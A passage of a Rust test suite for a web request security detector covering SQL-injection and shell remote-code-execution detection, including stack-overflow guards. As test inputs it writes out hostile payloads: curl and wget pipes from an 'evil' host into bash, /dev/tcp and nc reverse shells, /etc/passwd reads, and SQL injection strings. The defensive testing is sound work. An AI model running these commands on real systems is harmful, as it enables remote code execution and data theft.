            &parens,
            &nots,
            &cases,
            &unary_minus,
            &unary_plus,
            &tildes,
            &bangs,
            &mixed,
        ] {
            assert!(
                !ast_structural_depth_ok(deep),
                "deep input must be declined: depth guard"
            );
            // And end-to-end: detect returns None (no signal, no parse, no panic).
            assert!(
                ast_fire(deep).is_none(),
                "deep input must not fire (declined pre-parse)"
            );
        }
        // A realistically-nested but shallow subquery is still admitted + detected.
        assert!(ast_structural_depth_ok("1 = (select 1)"));
    }

    #[test]
    fn ast_depth_guard_counts_every_recursion_driver() {
        // Isolate the driver *scan* from the byte-length backstop: every input here
        // is short (well under AST_MAX_INPUT_BYTES), so a decline can only come from
        // the per-driver count. A run of 13 of any single recursion driver exceeds
        // MAX_AST_NESTING (12) and must be declined. Pre-fix, the unary `+`/`-` rows
        // asserted `false` but the scan returned `true` (they were uncounted) — this
        // test fails on the old code without aborting.
        let n = 13;
        let cases = [
            ("paren", format!("1 < {}1{}", "(".repeat(n), ")".repeat(n))),
            ("tilde", format!("1 < {}1", "~".repeat(n))),
            ("bang", format!("1 < {}1", "!".repeat(n))),
            ("minus", format!("1 < {}1", "- ".repeat(n))),
            ("plus", format!("1 < {}1", "+ ".repeat(n))),
            ("not", format!("1 or {}1", "not ".repeat(n))),
            ("interval", format!("1 < {}1", "interval ".repeat(n))),
        ];
        for (kind, s) in &cases {
            assert!(
                s.len() <= AST_MAX_INPUT_BYTES,
                "{kind} probe must exercise the scan, not the byte cap"
            );
            assert!(
                !ast_structural_depth_ok(s),
                "{kind} chain (>{MAX_AST_NESTING}) must be declined by the driver scan"
            );
        }
        // A short run of the same drivers (<= cap) is still admitted.
        assert!(ast_structural_depth_ok("1 < - - - 1"));
        assert!(ast_structural_depth_ok("1 or not not 1=1"));
    }

    #[test]
    fn ast_over_length_input_declined_by_byte_backstop() {
        // The byte backstop declines any input longer than AST_MAX_INPUT_BYTES even
        // when its per-driver depth is trivial, so a missed future driver cannot
        // overflow through a long input. `1 or 1=1 ` + padding parses trivially but
        // is over the cap.
        let long = format!("1 or 1=1 {}", "a".repeat(AST_MAX_INPUT_BYTES));
        assert!(long.len() > AST_MAX_INPUT_BYTES);
        assert!(!ast_structural_depth_ok(&long), "over-length input must be declined");
        assert!(ast_fire(&long).is_none(), "over-length input must not fire");
        // Exactly at the cap with trivial depth is still admitted.
        let at_cap = format!("1 or 1=1{}", " ".repeat(AST_MAX_INPUT_BYTES - "1 or 1=1".len()));
        assert_eq!(at_cap.len(), AST_MAX_INPUT_BYTES);
        assert!(ast_structural_depth_ok(&at_cap));
    }

    #[test]
    fn ast_parse_error_is_fail_safe_not_a_hit() {
        // Garbage / broken SQL that does not parse to an injection structure must
        // not be reported as an attack (a parse failure is not, by itself,
        // evidence) — and must never panic.
        for weird in [
            "select from where",
            "union union union",
            "' or or or",
            "'''",
            "; ; ;",
            "/*/*/*",
            "select select select",
        ] {
            assert!(
                ast_fire(weird).is_none(),
                "malformed SQL must not be reported as an AST injection: {weird:?}"
            );
        }
    }

    #[test]
    fn ast_budget_exhaustion_stops_parsing() {
        // Once the AST-attempt budget is spent, further parses are skipped (degraded)
        // — the detector must not exceed `max_ast_attempts_per_request`.
        use crate::checks::content_security::budget::Budget;
        let det = AstSqlDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::new(Budget {
            max_ast_attempts_per_request: 1,
            ..Budget::default()
        });
        // First injection spends the single numeric attempt and hits — budget now 0,
        // not yet degraded (the attempt was within budget).
        assert!(det.detect(&view("1 union select 1"), &pctx, &mut st).is_some());
        assert!(!st.is_degraded());
        // The next injection cannot take an attempt → no parse, no signal, degraded.
        assert!(det.detect(&view("1;drop table y"), &pctx, &mut st).is_none());
        assert!(st.is_degraded());
    }

    // ── RCE true shell-AST detector (T1-A, brush-parser) ─────────────────────

    fn rce_ast_fire(text: &str) -> Option<DetectionFinding> {
        run(&RceAstDetector::new(), text)
    }

    fn rce_ast_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&RceAstDetector::with_all_rules(), text)
    }

    #[test]
    fn rce_ast_id_and_config_string() {
        assert_eq!(RceAstDetector::new().id(), DetectorId::RceAst);
        assert_eq!(DetectorId::RceAst.as_config_str(), "rce_ast");
        assert_eq!(DetectorId::from_config_str("rce_ast"), Some(DetectorId::RceAst));
    }

    #[test]
    fn rce_ast_interp_exec_flag_fires() {
        // Interpreter with an inline-code flag as a real command head.
        for payload in [
            "bash -c 'id'",
            "sh -c \"cat /etc/passwd\"",
            "python3 -c 'import os'",
            "perl -e 'system(1)'",
        ] {
            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("interp exec flag must fire: {payload:?}"));
            assert_eq!(f.attack, AttackKind::Rce);
            assert_eq!(f.rule_key, "rce_ast.interp_exec_flag", "payload {payload:?}");
        }
    }

    #[test]
    fn rce_ast_heredoc_to_interpreter_fires() {
        // The genuine Lane-1/P1c gap: a here-document / here-string feeding an
        // interpreter — invisible to every structural regex.
        let hd = rce_ast_fire("bash <<EOF\nid\ncat /etc/passwd\nEOF\n").expect("here-doc → interpreter must fire");
        assert_eq!(hd.rule_key, "rce_ast.heredoc_interp");
        let hs = rce_ast_fire("bash <<< \"id\"").expect("here-string → interpreter must fire");
        assert_eq!(hs.rule_key, "rce_ast.heredoc_interp");
    }

    #[test]
    fn rce_ast_pipe_to_interpreter_fires() {
        for payload in [
            "curl http://evil/x | bash",
            "wget -qO- http://evil | sh",
            "echo aWQK | base64 -d | bash",
        ] {
            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("pipe→interp must fire: {payload:?}"));
            assert_eq!(f.rule_key, "rce_ast.pipe_to_interp", "payload {payload:?}");
        }
    }

    #[test]
    fn rce_ast_reverse_shell_fires() {
        // /dev/tcp redirect and `nc -e` — complete reverse-shell structures.
        assert_eq!(
            rce_ast_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
                .expect("/dev/tcp reverse shell must fire")
                .rule_key,
            "rce_ast.reverse_shell"
        );
        assert_eq!(
            rce_ast_fire("nc -e /bin/sh 10.0.0.1 4444")
                .expect("nc -e reverse shell must fire")
                .rule_key,
            "rce_ast.reverse_shell"
        );
    }

    #[test]
    fn rce_ast_command_substitution_fires() {
        // `$(id)` and backtick substitutions with a dangerous inner command.
        let f = rce_ast_fire("echo $(id)").expect("dollar-paren subst must fire");
        assert_eq!(f.rule_key, "rce_ast.cmd_subst");
        let a = rce_ast_fire("x=$(cat /etc/passwd)").expect("assignment subst must fire");
        assert_eq!(a.rule_key, "rce_ast.cmd_subst");
        let b = rce_ast_fire("echo `whoami`").expect("backtick subst must fire");
        assert_eq!(b.rule_key, "rce_ast.cmd_subst");
    }

    #[test]
    fn rce_ast_process_substitution_fires() {
        assert_eq!(
            rce_ast_fire("diff <(id) <(whoami)")
                .expect("process substitution must fire")
                .rule_key,
            "rce_ast.proc_subst"
        );
    }

    #[test]
    fn rce_ast_sensitive_read_fires() {
        assert_eq!(
            rce_ast_fire("cat /etc/passwd")
                .expect("reader + sensitive path must fire")
                .rule_key,
            "rce_ast.sensitive_read"
        );
    }

    #[test]
    fn rce_ast_subshell_wrapper_is_walked() {
        // A subshell / brace-group hiding the injected command is still caught.
        assert!(
            rce_ast_fire("(curl http://evil | bash)").is_some(),
            "subshell-wrapped pipe→interp"
        );
        assert!(
            rce_ast_fire("{ bash -c id ; }").is_some(),
            "brace-group-wrapped exec flag"
        );
    }

    #[test]
    fn rce_ast_strongest_rule_wins() {
        // reverse_shell (90) outranks a co-occurring interp_exec_flag (82).
        let f = rce_ast_fire("bash -c 'x' >& /dev/tcp/1.2.3.4/9001").expect("must fire");
        assert_eq!(f.rule_key, "rce_ast.reverse_shell");
        assert_eq!(f.confidence, 90);
    }

    #[test]
    fn rce_ast_cmd_subst_any_is_default_off() {
        // A substitution whose inner command is benign (`date`) is high-noise: it
        // only fires under the full rule set, never in production.
        assert!(
            rce_ast_fire("echo $(date)").is_none(),
            "benign subst is default-off in prod"
        );
        assert_eq!(
            rce_ast_fire_all("echo $(date)")
                .expect("benign subst fires under all rules")
                .rule_key,
            "rce_ast.cmd_subst_any"
        );
    }

    #[test]
    fn rce_ast_bypass_forms_fire() {
        // The shell-normalise preprocessor collapses these to a canonical form in
        // production; here we assert the AST detector fires on the de-obfuscated
        // shape it will receive (quotes stripped, $IFS→space), and on the raw
        // exec-flag form. base64-wrapped payloads reach this detector via the blind
        // base64 decode view carrying the decoded command.
        // Quote-split interpreter, post-normalisation:
        assert!(rce_ast_fire("bash -c id").is_some(), "canonical bash -c id");
        // $IFS-normalised sensitive read (what `cat$IFS/etc/passwd` collapses to):
        assert_eq!(
            rce_ast_fire("cat /etc/passwd")
                .expect("normalised sensitive read fires")
                .rule_key,
            "rce_ast.sensitive_read"
        );
        // base64-decoded reverse shell body (what the blind-decode view yields):
        assert_eq!(
            rce_ast_fire("bash -i >& /dev/tcp/127.0.0.1/1337 0>&1")
                .expect("decoded reverse shell fires")
                .rule_key,
            "rce_ast.reverse_shell"
        );
    }

    #[test]
    fn rce_ast_clean_traffic_does_not_fire() {
        // Prose, JSON, ordinary params, and legitimate shell-ish text must not fire.
        let clean = [
            "the quick brown fox jumps over the lazy dog",
            r#"{"cmd":"save","name":"alice","note":"pipe A | pipe B in a diagram"}"#,
            "q=laptop&sort=price&order=asc&page=2",
            "please run the batch export and email me the results",
            "SELECT price FROM catalog WHERE id = 5",
            "a | b | c table columns for the report",
            "revenue grew && margins held || guidance was cut",
            "email me at a@b.com -c for carbon copy",
            "the -config file lives in /etc/app and the docs mention bash scripting",
            "function greet() { return 'hi'; }",
            "echo hello world",
            "ls -la /home/user/documents",
        ];
        for c in clean {
            assert!(rce_ast_fire(c).is_none(), "clean AST negative fired: {c:?}");
        }
    }

    #[test]
    fn rce_ast_prefilter_spares_clean_traffic_budget() {
        // A string with no shell metacharacter never spends an AST attempt.
        let det = RceAstDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        assert!(det.detect(&view("the quick brown fox"), &pctx, &mut st).is_none());
        // The SQL AST budget is untouched — prove by exhausting exactly one attempt
        // afterwards on a real parse and observing it is admitted.
        assert!(!st.is_degraded());
    }

    #[test]
    fn rce_ast_budget_exhaustion_fails_open() {
        use crate::checks::content_security::budget::Budget;
        let det = RceAstDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::new(Budget {
            max_ast_attempts_per_request: 1,
            ..Budget::default()
        });
        // First dangerous view spends the single attempt and hits.
        assert!(det.detect(&view("bash -c id"), &pctx, &mut st).is_some());
        // The next cannot take an attempt → no parse, no signal, request degraded.
        assert!(det.detect(&view("curl http://evil | bash"), &pctx, &mut st).is_none());
        assert!(st.is_degraded());
    }

    #[test]
    fn rce_ast_oversized_input_is_declined() {
        let big = format!("bash -c '{}'", "a".repeat(SHELL_AST_MAX_INPUT_BYTES));
        assert!(rce_ast_fire(&big).is_none(), "oversized view is not AST-inspected");
    }

    // ── P0: shell-AST stack-overflow DoS guard (nested substitution) ─────────

    /// A deeply nested `$( … )` payload must be **declined before** the tokenizer,
    /// never crash. The raw `brush_parser::tokenize_str` overflows the worker's
    /// (2 MiB) stack at ~n=170 nested `$(` and aborts the process (SIGABRT) — which
    /// no `catch_unwind` can intercept. That this test *returns* (no abort) is the
    /// proof the guard rejects the input before any brush-parser call. n=682 fills
    /// the byte cap; both must decline.
    #[test]
    fn rce_ast_nested_substitution_declines_without_stack_overflow() {
        for n in [170usize, 682usize] {
            let payload = format!("a{}{}", "$(".repeat(n), ")".repeat(n));
            assert!(payload.len() <= SHELL_AST_MAX_INPUT_BYTES, "n={n} within byte cap");
            assert!(
                rce_ast_fire(&payload).is_none(),
                "n={n}: over-nested payload must be declined (guard), not parsed"
            );
        }
    }

    #[test]
    fn max_nesting_depth_counts_each_delimiter_form() {
        // Each recursion-driving delimiter form, nested to depth 3.
        assert_eq!(max_nesting_depth("a$($($(x)))"), 3, "dollar-paren");
        assert_eq!(max_nesting_depth("(((x)))"), 3, "subshell paren");
        assert_eq!(max_nesting_depth("${${${x}}}"), 3, "parameter expansion brace");
        assert_eq!(max_nesting_depth("{ { { x } } }"), 3, "brace group");
        assert_eq!(max_nesting_depth("<(<(<(x)))"), 3, "process substitution");
        // Arithmetic `$((` opens two parens per level.
        assert_eq!(max_nesting_depth("$(( 1 + 2 ))"), 2, "arithmetic doubles paren");
        // A single backtick pair toggles between 0 and 1.
        assert_eq!(max_nesting_depth("echo `id`"), 1, "backtick pair");
        assert_eq!(max_nesting_depth("plain text no delims"), 0, "no delimiters");
    }

    #[test]
    fn max_nesting_depth_resets_after_close_and_mixes_forms() {
        // Closed-then-reopened: depth returns to the shallow reopened level, not the sum.
        assert_eq!(max_nesting_depth("$($(x)) $($(y))"), 2, "reopen resets, not cumulative");
        // Mixed paren + brace + backtick are summed while concurrently open.
        assert_eq!(max_nesting_depth("$( ${ `x` } )"), 3, "mixed forms sum");
        // Unbalanced closers floor at zero (never underflow / wrap).
        assert_eq!(max_nesting_depth(")))abc"), 0, "leading closers floor at zero");
    }

    #[test]
    fn rce_ast_nesting_boundary_at_threshold() {
        // Exactly at the threshold is admitted by the guard (depth == 20 is allowed);
        // one deeper is declined. Use `$(` nesting so it also exercises the tokenizer
        // path at depth 20 without crashing (well below the ~150 overflow onset).
        let at = format!(
            "a{}{}",
            "$(".repeat(SHELL_MAX_NESTING_DEPTH),
            ")".repeat(SHELL_MAX_NESTING_DEPTH)
        );
        assert_eq!(max_nesting_depth(&at), SHELL_MAX_NESTING_DEPTH);
        // Guard admits depth==20 (does not early-decline); parsing it must not abort.
        let _ = rce_ast_fire(&at);
        let over = format!(
            "a{}{}",
            "$(".repeat(SHELL_MAX_NESTING_DEPTH + 1),
            ")".repeat(SHELL_MAX_NESTING_DEPTH + 1)
        );
        assert_eq!(max_nesting_depth(&over), SHELL_MAX_NESTING_DEPTH + 1);
        assert!(rce_ast_fire(&over).is_none(), "depth 21 declined by guard");
    }

    #[test]
    fn rce_ast_shallow_nesting_still_fires_after_guard() {
        // Regression red-line: the guard must not suppress genuine shallow-nesting
        // catches. Each of these has nesting depth well under the threshold.
        assert!(max_nesting_depth("bash <<EOF\nid\nEOF\n") <= SHELL_MAX_NESTING_DEPTH);
        assert_eq!(
            rce_ast_fire("bash <<EOF\nid\ncat /etc/passwd\nEOF\n")
                .expect("here-doc → interpreter still fires")
                .rule_key,
            "rce_ast.heredoc_interp"
        );
        assert_eq!(
            rce_ast_fire("bash -c id").expect("bash -c still fires").rule_key,
            "rce_ast.interp_exec_flag"
        );
        assert_eq!(
            rce_ast_fire("echo $(id)").expect("shallow $() still fires").rule_key,
            "rce_ast.cmd_subst"
        );
        assert_eq!(
            rce_ast_fire("echo `whoami`").expect("backtick still fires").rule_key,
            "rce_ast.cmd_subst"
        );
        assert_eq!(
            rce_ast_fire("curl http://evil/x | bash")
                .expect("pipe→interp still fires")
                .rule_key,
            "rce_ast.pipe_to_interp"
        );
        assert_eq!(
            rce_ast_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
                .expect("reverse shell still fires")
                .rule_key,
            "rce_ast.reverse_shell"
        );
    }
}
